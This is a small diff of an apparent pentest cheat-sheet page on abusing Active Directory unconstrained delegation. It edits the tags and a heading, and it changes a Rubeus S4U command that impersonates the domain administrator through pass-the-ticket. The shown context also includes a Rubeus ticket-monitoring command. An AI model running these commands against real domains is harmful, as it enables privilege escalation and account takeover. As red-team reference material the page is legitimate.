@@ -1,9 +1,9 @@
 ---
 title: "Unconstrained Delegation"
-tags: ["Pass-The-Ticket", "S4U", "Ticket Granting Ticket", "Unconstrained Delegation", "Active Directory", "Windows", "PsExec"]
+tags: ["Active Directory", "Unconstrained Delegation", "Pass-The-Ticket", "PsExec", "S4U", "Ticket Granting Ticket", "Windows"]
 ---
 
-### Abuse #1: Capture Ticket
+### Capture Cached Ticket
 
 {{< tab set1 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
@@ -144,7 +144,7 @@ PS C:\programdata> .\rubeus.exe monitor /interval:1 /nowrap
 #### 4. Impersonate
 
 ```console
-.\rubeus.exe s4u /impersonateuser:administrator /ticket:<BASE64_TICKET> /altservice:cifs/<TARGET_DOMAIN> /self /ptt
+.\rubeus.exe s4u /impersonateuser:administrator /ticket:<BASE64_TICKET> /altservice:<SPN> /self /ptt
 ```
 
 ```console {class="sample-code"}
